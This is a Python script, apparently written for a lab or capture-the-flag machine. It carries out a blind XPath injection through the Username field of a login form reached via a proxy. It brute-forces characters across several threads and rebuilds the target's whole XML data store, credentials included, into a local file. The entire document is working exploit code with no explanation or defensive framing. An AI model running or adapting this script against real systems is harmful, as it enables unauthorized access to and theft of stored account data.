#!/usr/bin/python3

import requests
import string
import xml.etree.ElementTree as ET
import concurrent.futures


def inject(payload): ## function that returns True in the case of a success condition
	url = "http://172.31.179.1/intranet.php"
	username = fr"' or {payload} or 'a'='a"
	password = f"test"
	r = requests.post(url, data={"Username":username, "Password":password}, proxies={"http": "http://10.129.24.223:3128"})
	return len(r.content) > 7000
	

def extract_data(data, path, index):
	if data == "node":
		query = fr"substring(name({path}/*[{index}])"
		charspace = string.ascii_lowercase + string.ascii_uppercase + "0123456789" + "."
		
	elif data == "content":
		newpath = "/" + "/".join(path.split("/")[1:-1])
		node = "/" + path.split("/")[-1]
		query = fr"substring({newpath}[position()={index}]{node}"
		charspace = "".join(chr(i) for i in range(ord("!"), ord("~") + 1))
		
	skeleton = r"{},{},1)='{}'"
	output = ""
	current_char = "1"
	done = False
	while True:
		for char in charspace:
			if inject(skeleton.format(query, current_char, char)):
				output += char
				current_char = str(int(current_char)+1)
				done = False
		if done == True:
			break
		done = True
	if output and data=="node":
		print("Node: " + output)
	return output
	
	
def map_helper(args):
	return extract_data(args[0], args[1], args[2])
	
	
def gen_xml():
	tree = {1:[]}
	depth = 1
	root = extract_data("node", "", 1)
	tree[1].append(("/"+root,(ET.Element(root))))
	nodes_done = False
	while not nodes_done:
		tree[depth+1] = []
		for idx, i in enumerate(tree[depth]):
			index = 1
			done = False
			while not done:
				with concurrent.futures.ThreadPoolExecutor() as executor:
					threads = [("node", tree[depth][idx][0], thread) for thread in range(index,index+5)]
					for result in executor.map(map_helper, threads):
						if result == "":
							done = True
						else:
							tree[depth+1].append((tree[depth][idx][0]+"/"+result, (ET.SubElement(tree[depth][idx][1], result))))
				index += 5
						
		if tree[depth+1] == []:
			nodes_done = True
		depth += 1

	leaves = {}
	queue = []
	for i in tree:
		for jindex, j in enumerate(tree[i]):
			if len(j[1]) == 0:
				try:
					leaves[j[0]] += 1
				except KeyError:
					leaves[j[0]] = 1
				queue.append((i, jindex, leaves[j[0]]))
					
	print()			
	index = 0
	while index < len(queue):
		with concurrent.futures.ThreadPoolExecutor() as executor:
			threads = [("content", tree[queue[i][0]][queue[i][1]][0], queue[i][2]) for i in range(index, min(index + 5, len(queue)))]
			for idx, result in enumerate(executor.map(map_helper, threads), start=index):
				print(tree[queue[idx][0]][queue[idx][1]][0].split("/")[-1].capitalize() + ": " + result)
				tree[queue[idx][0]][queue[idx][1]][1].text = result
		index += 5
				
	final_tree = ET.ElementTree(tree[1][0][1])
	ET.indent(final_tree)
	final_tree.write("output.xml")
	print("Done! Read using: xmllint --format output.xml | highlight --syntax=xml --out-format=xterm256 | less -R -N")
	

def main():
	gen_xml()
	
if __name__ == "__main__":
	main()
